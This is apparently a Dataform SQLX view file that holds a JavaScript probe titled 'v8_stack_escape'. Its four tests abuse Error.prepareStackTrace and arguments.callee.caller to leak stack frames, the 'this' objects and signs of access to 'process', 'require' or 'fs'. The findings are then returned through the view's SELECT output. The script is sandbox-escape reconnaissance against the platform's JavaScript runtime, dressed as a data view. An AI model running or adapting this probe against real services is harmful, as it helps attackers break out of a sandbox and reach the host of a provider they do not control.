config { type: "view", name: "v8_stack_escape" }

js {
  let results = [];

  // Test 1: Basic prepareStackTrace
  try {
    let leaked = [];
    const origPrepare = Error.prepareStackTrace;

    Error.prepareStackTrace = (err, stack) => {
      stack.forEach((frame, i) => {
        leaked.push({
          idx: i,
          fn: frame.getFunctionName(),
          file: frame.getFileName(),
          line: frame.getLineNumber(),
          thisType: typeof frame.getThis(),
          thisKeys: frame.getThis() ? Object.keys(frame.getThis()).slice(0,10) : null,
          typeName: frame.getTypeName(),
          evalOrigin: frame.getEvalOrigin(),
          isConstructor: frame.isConstructor(),
          isNative: frame.isNative()
        });
      });
      return 'captured';
    };

    const e = new Error('test');
    e.stack; // Trigger prepareStackTrace

    Error.prepareStackTrace = origPrepare;
    results.push('1_stack_frames: ' + JSON.stringify(leaked).substring(0, 500));
  } catch(e) {
    results.push('1_stack_error: ' + e.message);
  }

  // Test 2: Try to get 'this' reference from stack frames
  try {
    let thisRefs = [];
    Error.prepareStackTrace = (err, stack) => {
      stack.forEach(frame => {
        const thisObj = frame.getThis();
        if (thisObj && typeof thisObj === 'object') {
          thisRefs.push({
            type: thisObj.constructor?.name,
            keys: Object.keys(thisObj).slice(0, 20),
            hasProcess: 'process' in thisObj,
            hasRequire: 'require' in thisObj,
            hasFs: 'fs' in thisObj
          });
        }
      });
      return '';
    };
    new Error().stack;
    results.push('2_this_refs: ' + JSON.stringify(thisRefs).substring(0, 300));
  } catch(e) {
    results.push('2_this_error: ' + e.message);
  }

  // Test 3: Recursive stack capture
  try {
    function deep(n) {
      if (n === 0) {
        Error.prepareStackTrace = (e, s) => s.map(f => f.getFunctionName()).join(',');
        return new Error().stack;
      }
      return deep(n - 1);
    }
    results.push('3_deep_stack: ' + deep(10));
  } catch(e) {
    results.push('3_deep_error: ' + e.message);
  }

  // Test 4: Check if we can access caller chain
  try {
    function outer() {
      function inner() {
        return arguments.callee.caller;
      }
      return inner();
    }
    const caller = outer();
    results.push('4_caller: ' + (caller ? 'EXISTS' : 'null'));
  } catch(e) {
    results.push('4_caller: ' + e.message.substring(0, 50));
  }
}

SELECT '${JSON.stringify(results)}' as v8_stack_results
